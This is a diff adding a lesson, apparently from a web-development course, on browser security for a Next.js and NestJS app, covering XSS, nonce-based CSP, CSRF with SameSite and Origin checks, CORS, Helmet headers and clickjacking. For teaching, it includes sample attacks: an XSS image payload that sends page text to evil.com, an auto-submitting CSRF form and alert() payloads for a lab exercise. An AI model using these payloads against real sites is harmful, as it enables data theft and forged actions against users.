@@ -1,0 +1,261 @@
+---
+title: "Lesson 7: Browser security: XSS, CSP, CSRF, CORS and headers"
+description: "The same-origin policy, XSS and the places React doesn't protect you, a nonce-based Content Security Policy in Next.js, CSRF and how SameSite plus an Origin check stop it, what CORS really is and how to configure it, Helmet and security headers, and clickjacking."
+---
+
+Your API now uses cookies. Cookies are sent **automatically** by the browser, which is what makes them convenient and also what attackers abuse. This lesson covers the browser-side attacks every full-stack engineer is asked about, and the exact settings for your Next.js + NestJS setup.
+
+## The same-origin policy in one paragraph
+
+A page from one **origin** (scheme + host + port) can **send** requests to another origin, but its JavaScript **can't read the responses**, and it can't read the other origin's cookies, storage or DOM. Every attack in this lesson is a way around that rule:
+
+| Attack | How it gets around the rule |
+| --- | --- |
+| XSS | The attacker's code runs **inside your origin**, so the rule doesn't apply to it |
+| CSRF | The attacker doesn't need to read the response; **sending** the request (with your cookies) is enough |
+| Clickjacking | The attacker shows **your page** in a hidden frame and tricks the user into clicking |
+| A bad CORS config | **You** tell the browser to let other origins read your responses |
+
+## XSS (cross-site scripting)
+
+XSS means the attacker gets **their JavaScript** to run on **your** page. Then it can do anything the user can: read the page, call your API with the user's cookies, change their email, show a fake login form.
+
+| Type | Example in a booking app |
+| --- | --- |
+| **Stored** | A customer books with the name `<img src=x onerror="fetch('https://evil.com?c='+document.body.innerText)">`, and it runs when the owner opens the dashboard |
+| **Reflected** | A search page prints `?q=...` from the URL into the HTML |
+| **DOM-based** | Frontend code does `element.innerHTML = location.hash.slice(1)` |
+
+### React protects you, except here
+
+React escapes everything you put in `{...}`, so `<p>{booking.customerName}</p>` is safe. The dangerous places are where you skip React's escaping:
+
+| Dangerous | Why | Safe version |
+| --- | --- | --- |
+| `dangerouslySetInnerHTML={{ __html: text }}` | Raw HTML | Don't. If you must (rich text from an editor), clean it with **DOMPurify** first |
+| `<a href={userUrl}>` | `javascript:alert(1)` is a valid URL. Recent React versions block `javascript:` URLs, but don't rely on it | Allow only `http:` and `https:` with `new URL(...)` |
+| Rendering Markdown from users | Many Markdown libraries allow raw HTML | Turn raw HTML off, or sanitise the output |
+| User-uploaded **SVG** or **HTML** files served from your domain | SVG can contain `<script>` | Serve uploads from a separate domain, with `Content-Disposition: attachment` |
+| `<script>window.__DATA__ = ${JSON.stringify(data)}</script>` | A value containing `</script>` breaks out | Let Next.js pass data; or escape `<` as `<` |
+| `eval`, `new Function`, `setTimeout(string)` | Code from strings | Never with user data |
+
+```typescript
+export function safeExternalUrl(value: string): string | null {
+  try {
+    const url = new URL(value);
+    return url.protocol === 'https:' || url.protocol === 'http:' ? url.href : null;
+  } catch {
+    return null;
+  }
+}
+```
+
+On the **API** side: return JSON with `Content-Type: application/json` (Nest does this), never HTML built from user input, and send `X-Content-Type-Options: nosniff` (Helmet does this) so a browser never treats your JSON as HTML.
+
+**Validation is not the XSS fix.** Rejecting `<` in names breaks real names and misses other tricks. The fix is **escaping at output**, in the right context. Validation is an extra layer.
+
+## Content Security Policy (CSP)
+
+CSP is a response header that tells the browser which scripts may run. With a strict CSP, even if an attacker injects a `<script>` tag, the browser refuses to run it. It's your **second layer** against XSS.
+
+The modern approach is a **nonce**: a new random value for every page response. Only `<script>` tags with that nonce run.
+
+```http
+Content-Security-Policy: script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
+```
+
+In Next.js 16, set it in `proxy.ts` (the file was called `middleware.ts` before Next.js 16):
+
+```typescript
+// proxy.ts (frontend root)
+import { NextResponse, type NextRequest } from 'next/server';
+
+export function proxy(request: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
+  const isDev = process.env.NODE_ENV === 'development';
+
+  const csp = [
+    `default-src 'self'`,
+    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${isDev ? " 'unsafe-eval'" : ''}`,   // dev mode needs eval
+    `style-src 'self' 'nonce-${nonce}'`,
+    `img-src 'self' blob: data:`,
+    `font-src 'self'`,
+    `connect-src 'self'`,                  // with the /v1 proxy, the API is 'self'
+    `object-src 'none'`,
+    `base-uri 'self'`,
+    `form-action 'self'`,
+    `frame-ancestors 'none'`,              // nobody may put your app in a frame (clickjacking)
+    `upgrade-insecure-requests`,
+  ].join('; ');
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set('x-nonce', nonce);                       // for your own <Script> tags: read it with headers()
+  requestHeaders.set('Content-Security-Policy', csp);         // Next.js reads the nonce from here and adds it to its scripts
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set('Content-Security-Policy', csp);
+  return response;
+}
+
+export const config = {
+  matcher: [{ source: '/((?!v1|_next/static|_next/image|favicon.ico).*)' }],   // pages only, not the API proxy or static files
+};
+```
+
+Things to know:
+
+- Nonces need a fresh value per request, so pages become **dynamically rendered** (no static HTML). For a logged-in dashboard, that's fine.
+- **Roll it out safely:** send `Content-Security-Policy-Report-Only` first. The browser reports violations in the console without blocking anything. Fix them, then switch to the real header.
+- Third-party scripts (analytics, Stripe.js, a chat widget) need their domains added. Stripe's docs list the exact CSP entries it needs.
+- Check the [Next.js CSP guide](https://nextjs.org/docs/app/guides/content-security-policy) when you set it up; this is the area where details change between versions.
+
+## CSRF (cross-site request forgery)
+
+CSRF tricks the user's browser into sending a request **with their cookies** from another site:
+
+```html
+<!-- on evil.com; the victim is logged in to your app in another tab -->
+<form action="https://app.example.com/v1/bookings/123/cancel" method="POST">
+  <input type="hidden" name="reason" value="x" />
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+The attacker can't read the response (same-origin policy), but they don't need to: the booking is already cancelled.
+
+**CSRF only matters when the browser sends credentials automatically**, which means cookies. An API that only accepts `Authorization: Bearer` headers isn't vulnerable, because evil.com can't add that header. You chose cookies (Lesson 2), so you need CSRF defences.
+
+### Your defences, in layers
+
+| Defence | What it stops | Your setup |
+| --- | --- | --- |
+| **`SameSite=Lax` / `Strict`** cookies | The browser doesn't send them on cross-site `POST`s, `fetch`es or iframes | Done in Lessons 2–3 |
+| **No state changes on `GET`** | `Lax` cookies **are** sent on top-level `GET` navigations, so a `GET` that cancels a booking is still attackable | REST design (Node.js section) |
+| **Check `Origin` on unsafe methods** | Covers what `SameSite` doesn't: **sibling subdomains** (`evil.example.com` counts as the **same site** as `app.example.com`), old browsers | `OriginGuard` below |
+| **Only accept `application/json`** | HTML forms can't send JSON, and a cross-origin `fetch` with JSON triggers a CORS preflight | Make the JSON body parser strict about content type |
+| **CSRF tokens** | The classic defence for server-rendered forms | Not needed with the layers above; know what they are |
+
+```typescript
+// src/common/security/origin.guard.ts
+const SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);
+
+@Injectable()
+export class OriginGuard implements CanActivate {
+  private readonly allowed: Set<string>;
+
+  constructor(config: ConfigService<Env, true>) {
+    this.allowed = new Set([new URL(config.get('APP_URL', { infer: true })).origin]);
+  }
+
+  canActivate(context: ExecutionContext): boolean {
+    const req = context.switchToHttp().getRequest<Request>();
+    if (SAFE_METHODS.has(req.method)) return true;
+
+    const usesCookies = Boolean(req.cookies?.[ACCESS_COOKIE] || req.cookies?.[REFRESH_COOKIE]);
+    if (!usesCookies) return true;                     // API keys and anonymous requests can't be CSRF'd
+
+    // Modern browsers send Sec-Fetch-Site on every request
+    const fetchSite = req.header('sec-fetch-site');
+    if (fetchSite === 'cross-site') throw new ForbiddenException('Cross-site request blocked');
+
+    const origin = req.header('origin');
+    if (origin && this.allowed.has(origin)) return true;
+    throw new ForbiddenException('Cross-site request blocked');
+  }
+}
+```
+
+Register it as the **first** global guard. Browsers always send `Origin` on `POST`, `PUT`, `PATCH` and `DELETE`, so your own frontend passes, and requests from other sites don't.
+
+**Login CSRF** is a variant: the attacker logs **you** into **their** account (you then add your card to it). The `state` check in Google login (Lesson 5) and the Origin check on `/auth/login` stop it.
+
+## CORS: what it is and isn't
+
+CORS (cross-origin resource sharing) is a way for **your server** to tell browsers: "pages from these other origins **may read** my responses."
+
+What people get wrong:
+
+- CORS is **not** a protection for your API. It **relaxes** the same-origin policy. `curl`, Postman and attackers' servers ignore it completely.
+- Without CORS headers, a cross-origin request is often still **sent** and processed; the browser just hides the response. That's why CSRF defences are separate.
+- A **preflight** (`OPTIONS`) happens first for "non-simple" requests: JSON bodies, custom headers like `X-Business-Id`, or methods like `PATCH`. If the preflight fails, the real request isn't sent.
+
+With the Next.js proxy from Lesson 2, the browser only talks to its own origin: **you don't need CORS at all**. If your frontend calls the API directly on another origin (for example `api.example.com`), configure it exactly:
+
+```typescript
+// src/main.ts (only if browsers call the API from another origin)
+app.enableCors({
+  origin: config.get('CORS_ORIGINS', { infer: true }),   // an exact list: ['https://app.example.com']
+  credentials: true,                                    // allow cookies
+  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Idempotency-Key', 'If-Match', 'X-Business-Id', 'X-Request-Id'],
+  exposedHeaders: ['ETag', 'Location', 'Retry-After'],  // headers the frontend JS may read
+  maxAge: 600,                                          // cache the preflight for 10 minutes
+});
+```
+
+| Dangerous CORS config | Why |
+| --- | --- |
+| `origin: true` or reflecting any `Origin` **with** `credentials: true` | Any website can read any logged-in user's data. This is a real, common vulnerability |
+| `origin: '*'` with cookies | Browsers refuse it, so people "fix" it with the one above |
+| Matching with `endsWith('example.com')` or a loose regex | `evilexample.com` and `example.com.evil.net` pass |
+| Allowing the `null` origin | Sandboxed iframes and local files send `Origin: null`; attackers can too |
+
+## Security headers with Helmet
+
+```typescript
+// src/main.ts
+import helmet from 'helmet';
+app.use(helmet());
+```
+
+Helmet's defaults are good for a JSON API. What the important ones do:
+
+| Header | Effect |
+| --- | --- |
+| `Strict-Transport-Security` (HSTS) | Browsers only use HTTPS for your domain from now on, so nobody can downgrade a user to HTTP |
+| `X-Content-Type-Options: nosniff` | The browser trusts your `Content-Type` and doesn't guess |
+| `X-Frame-Options: SAMEORIGIN` / CSP `frame-ancestors` | Other sites can't frame your pages (clickjacking) |
+| `Referrer-Policy: no-referrer` | URLs (and any tokens in them) aren't sent to other sites |
+| `Cross-Origin-Resource-Policy: same-origin` | Other sites can't load your responses as images or scripts. If your API serves images to another origin, relax this one |
+| `Content-Security-Policy` | Helmet's default CSP; it matters most for HTML pages |
+| Removes `X-Powered-By` | Doesn't tell attackers you run Express |
+
+Swagger UI (`/docs`) uses inline scripts, so Helmet's default CSP can break it. Either relax CSP for `/docs` only, or turn Swagger off in production.
+
+The **frontend** needs headers too: CSP from `proxy.ts`, and the others through `headers()` in `next.config.ts` (HSTS is often added by the hosting platform, for example Vercel).
+
+## Clickjacking
+
+The attacker puts your page in an invisible `<iframe>` on their site, over a button like "Claim your prize". The user clicks "Delete business" on your page without seeing it. `frame-ancestors 'none'` (CSP) and `X-Frame-Options` stop it. If you ever need your booking widget embedded on customers' websites, allow only that page, only for the domains of the businesses that embed it.
+
+## Mistakes to avoid
+
+- "React is safe from XSS", while using `dangerouslySetInnerHTML` or `href={userInput}`.
+- Trying to stop XSS by rejecting characters in input.
+- A CSP with `'unsafe-inline'` in `script-src` (it allows almost every XSS).
+- Changing state with `GET`.
+- Thinking `SameSite` protects you from your own subdomains.
+- Reflecting any `Origin` with `credentials: true`.
+- Thinking CORS protects an API from attackers.
+- Turning off Helmet because Swagger broke.
+
+## Exercises
+
+- **7.1** 🟢 For each, write "XSS", "CSRF", "clickjacking", "CORS" or "safe", and why: (a) `<div dangerouslySetInnerHTML={{ __html: service.description }} />`; (b) `GET /v1/bookings/:id/cancel`; (c) `app.enableCors({ origin: true, credentials: true })`; (d) `<p>{customer.name}</p>`; (e) no `frame-ancestors` and no `X-Frame-Options` on the settings page.
+- **7.2** 🟡 **Attack it.** Create a booking with the customer name `<img src=x onerror=alert(document.domain)>`. Show it in your Next.js dashboard normally (safe), then with `dangerouslySetInnerHTML` (alert!). Add the CSP from this lesson and load the unsafe version again: what does the console say?
+- **7.3** 🟡 Add `OriginGuard` and Helmet to the API. Write a small `evil.html` served from another port (`npx serve` on port 5000) that submits a form to `POST /v1/auth/logout` and does a `fetch` with `credentials: 'include'` to cancel a booking. Show that both fail, and say which defence stopped each one. Then remove `SameSite` from the cookies and try again: what still protects you?
+- **7.4** 🔴 Turn the CSP on in `Content-Security-Policy-Report-Only` mode in your Next.js app, use every page, fix every violation, then switch to the enforcing header. Write down every violation you had and what fixed it.
+
+## My notes and mistakes
+
+_Add the mistakes I made in this lesson and what fixed them._
+
+## Interview answer
+
+**"What is XSS and how do you prevent it in a React app?"**
+
+> "Cross-site scripting is when an attacker gets their JavaScript to run on my page, usually through data like a customer name that's stored and later shown to other users. The script then acts as the logged-in user. React escapes values in JSX, so the main risks are dangerouslySetInnerHTML, user-controlled URLs in href, rendering Markdown or user-uploaded SVG and HTML. I avoid those, sanitise with DOMPurify when rich text is really needed, and allow only http and https links. As a second layer I use a nonce-based Content Security Policy, so injected scripts don't run, and I keep tokens in httpOnly cookies so a script can't steal them."
+
+**"What's the difference between CSRF and CORS?"**
+
+> "CSRF is an attack: another website makes the user's browser send a request to my app, and the browser attaches the user's cookies automatically, so the request is accepted. CORS is a mechanism, not an attack: it's how my server tells the browser which other origins are allowed to read my responses. CORS doesn't protect against CSRF, because the request can be sent even when the response can't be read. Against CSRF I use SameSite cookies, no state changes on GET, and an Origin check on unsafe methods. For CORS, I avoid it entirely by proxying the API through the frontend's domain, and when it's needed I allow an exact list of origins, never a reflected origin with credentials."
